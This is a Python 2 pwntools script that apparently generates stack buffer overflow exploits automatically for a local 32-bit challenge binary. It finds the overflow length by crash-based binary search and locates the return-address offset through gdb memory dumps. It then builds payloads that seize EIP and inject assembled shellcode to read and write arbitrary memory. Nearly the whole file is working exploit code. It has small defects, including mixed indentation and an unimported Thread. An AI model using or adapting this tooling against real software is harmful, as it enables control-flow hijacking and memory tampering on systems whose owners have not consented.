import subprocess
import signal
import random
import time
import re
import thread
from threading import Timer
from pwn import *
import os

class StackOverflow:

    def __init__(self, base_path, filename, target_eip, max_stack, min_stack):
        self.ret_addr = 0
        self.buffer_base = 0
        self.payload = ''
        self.addition = 0
        self.ret_offset = 0
        self.base_path = base_path
        self.overflow_length = 0
        self.filename = filename
        self.bin_path = self.base_path + self.filename
        self.min_stack = min_stack
        self.max_stack = max_stack
        self.tmp_input = '/tmp/tmp_input'+str(random.randint(0, 99999999))
        self.target_eip = target_eip
	self.eip_control_payload = ''
	self.mem_read_payload = ''
	self.mem_write_payload = ''
        while not self.mkdir(self.tmp_input):
            self.tmp_input = '/tmp/tmp_input'+str(random.randint(0, 99999999))

    def run_target(self, path):
        kill = lambda process: process.kill()
        proc = subprocess.Popen([self.bin_path], stdin=open(
        path, 'rb'), stdout=subprocess.PIPE)
        my_timer = Timer(3,kill, [proc])
        try:
            my_timer.start()
            streamdata = proc.communicate()[0]
        finally:
            my_timer.cancel()
        return proc

    def is_crash(self, seed):
        try:
            tmp_path = self.tmp_input+'/eip_payload'
            f = open(tmp_path,'w')
            f.write(seed)
            f.close()
        except Exception:
            return False
        #print tmp_path
        #time.sleep(2)
        proc = self.run_target(tmp_path)
        retcode = proc.poll()
        #print proc.returncode
        if retcode is None:
            proc.kill()
            return False
        if proc.returncode == -signal.SIGSEGV or proc.returncode == signal.SIGSEGV:
            return True
        if proc.returncode == -signal.SIGILL or proc.returncode == signal.SIGILL:
            return True
        return False

    def mkdir(self,path):
        if os.path.exists(path):
            return False
        os.makedirs(path)
        return True

    def detect_crash(self, num,seed):
        """
        ascii of space is 0x20, make sure there is no addr with header of 0x20
        """
        return self.is_crash(seed[0:8]+(num-8)*' ')


    def dichotomy(self, min, max,seed):
        #print(min,max)
        if min==max:
            """
            if crash occured, meaning it located at the first position of return addr
            if not, meaning it located at the beginning of return addr 
            """
            
            if self.detect_crash(min, seed):
                return min-1
            else:
                if self.detect_crash(min+1, seed):
                    return min
                return -1

        mid = (min+max) >> 1
        if self.detect_crash(mid, seed):
            return self.dichotomy(min, mid, seed)
        else:
            return self.dichotomy(mid+1,max, seed)


    def gdb_script(self):
        ext = str(random.randint(0, 99999999))
        f = open('./gdbscript'+ext,'w')
        #f.write('source ~/peda-master/peda.py\n')
        #f.write('set logging \n')
        f.write('set logging on gdb'+ext+'.txt\n')
        f.write('file '+self.bin_path+'\n')
        f.write('r < '+ self.tmp_input +'/eip_payload\n')
        #f.write('x/w 0xffffccf0\n')
        f.write('dump memory '+self.tmp_input+'/dump'+ext+' '+hex(self.max_stack)+' '+hex(self.min_stack)+'\n')
        f.write('set logging off\n')
        #f.write('searchmem '+hex(target_eip)+'\n')
        f.write('quit\n')
        f.close()
        os.system('gdb -x ./gdbscript'+ext)
        os.system('rm gdbscript'+ext)
        return ext

    def get_ret_offset(self, length, target_eip):
        for i in range(2,length/4):
            l = list(self.payload)
            l[i*4+self.addition:(i+1)*4+self.addition]=p32(0xdeadbeef)
            if i!=0:
                l[(i-1)*4+self.addition:i*4+self.addition] = p32(target_eip)
            self.payload = "".join(l)
            f = open(self.tmp_input + '/eip_payload','w')
            f.write(self.payload)
            f.close()
            ext = self.gdb_script()
            f = open('gdb'+ext+'.txt', 'r')
            log_str = f.read()
            f.close()
            ret = log_str.partition('fault.\n')[2].partition(' in')[0]   
            os.system('rm gdb'+ext+'.txt')
            os.system('rm '+self.tmp_input+'/dump'+ext)
            if ret == '':
                ret = -1
                continue

            if hex(int(ret,16)) == '0xdeadbeef':
                l[i*4+self.addition:(i+1)*4+self.addition]=p32(target_eip)
                self.eip_control_payload = "".join(l)
                return i*4
            


    def dump_memory(self, target_eip):
        ext = self.gdb_script()
        sum = 0
        f = open(self.tmp_input  + '/dump' + ext,'r')
        dump_text = f.readlines()
        for line in dump_text[::-1]:
            index = line.find(p32(target_eip))
            #print 'length',len(line)
            #print index
            if index!=-1:
                contain_buffer_offset = len(line)-index+1 + 8
                #except_buffer_offset = line[::-1].find(p32(target_eip)[::-1])+1
                self.addition = contain_buffer_offset - contain_buffer_offset / 4 * 4
                self.payload = self.payload[0:8] + 'Z'*self.addition + self.payload[8:]
                #print self.payload
                break
            else:
                sum += len(line)
        f = open(self.tmp_input + '/eip_payload','w')
        f.write(self.payload)
        f.close()
	self.eip_control_payload = self.payload
        self.ret_offset = self.get_ret_offset(len(self.payload), target_eip)
        self.buffer_base = self.min_stack - sum - contain_buffer_offset + self.overflow_length
        self.ret_addr = self.min_stack - sum - contain_buffer_offset + self.ret_offset + 4 - 1
        
        """
        print 'contain_buffer_offset',contain_buffer_offset
        
        print 'ret_offset',self.ret_offset
        print 'sum',sum
        print hex(self.buffer_base)
        print hex(self.ret_addr)
        """
        

    def write_to_memory(self, target_write_mem, target_write_text):
        shellcode = asm('''mov eax, %s
        mov dword ptr [eax], %s
        ''' % (hex(target_write_mem), hex(target_write_text)))
        write_payload = self.payload[0:self.ret_offset+self.addition] + p32(self.ret_addr+0x4) + shellcode + (self.overflow_length+40-self.ret_offset-4-len(shellcode))*' '
        self.mem_write_payload = write_payload

    def read_memory(self, buf, count, protect_register=False):
        shellcode = asm('''
        push 0x3a
        push 0x5d746c75
        push 0x7365525b''')
        shellcode += self.print_memory('esp', 9)
        shellcode += self.print_memory(buf, count, protect_register=False)
        read_payload = self.payload[0:self.ret_offset+self.addition] + p32(self.ret_addr+0x4) + shellcode + (self.overflow_length+4-self.ret_offset-4-len(shellcode))*' '
        self.mem_read_payload = read_payload
        #self.run_target(self.tmp_input + '/read_payload')

    def print_memory(self, buf, count, protect_register=False):
        '''count < 256 buf:int(addr) or register'''
        try:
            buf = hex(buf)
        except:
            pass
        ret = asm('''
    xor eax, eax
    mov al, 0x4
    xor ebx, ebx
    mov bl, 0x1
    mov ecx, %s
    xor edx, edx
    mov dl, %s
    int 0x80
    ''' % (buf, hex(count)))
        if protect_register is True:
            ret = asm('pushad') + ret + asm('popad')
        return ret

    def main_logic(self, seed, read_mem, write_mem, write_text):
        """
        get eip,read_addr,write_addr and write content
        """

        #target_read_mem = get_read_mem()
        #target_write_mem,target_write_text = get_write_mem()


        self.overflow_length = 0
        """
        put your crash-detector into this function
        """
        self.overflow_length = self.dichotomy(8,len(seed), seed)
        if self.overflow_length == -1:
            print 'fail'
            return -1
        #control eip
        #print 'overflow_length',self.overflow_length
        
        self.payload = seed[0:8]+p32(self.target_eip)*((self.overflow_length-8)/4)+p32(self.target_eip)
        #print 'payload_length',len(self.payload)
        #gdb.attach(p,'dump memory dump2 0xffffcd88 0xffffcd8c\nquit')
        #p.kill()
        #print self.payload
        f = open(self.tmp_input+'/eip_payload','w')
        f.write(self.payload)
        f.close()
        #print os.listdir('~/')
        
        self.buffer_base = 0
        self.ret_addr = 0
        gdb_thread = Thread(target=self.dump_memory, args=(self.target_eip,))
        gdb_thread.start()
        gdb_thread.join()
        #print 'payload_length',len(self.payload)
        if self.buffer_base!=0 and self.ret_addr!=0:
            #write_to_memory(target_write_mem,target_write_text)
            self.read_memory(read_mem,4)
            self.write_to_memory(write_mem,write_text)
        #print self.tmp_input
            
        
        

if __name__ == '__main__':
    p = StackOverflow('/home/etenal/Downloads/', '80_YY_IO_BS_005_eip', 0x78777675,0xfffdd000,0xffffe000)
    p.main_logic('A'*260,0xffffcd1c,0xffffcd1c,0xdeadbeef)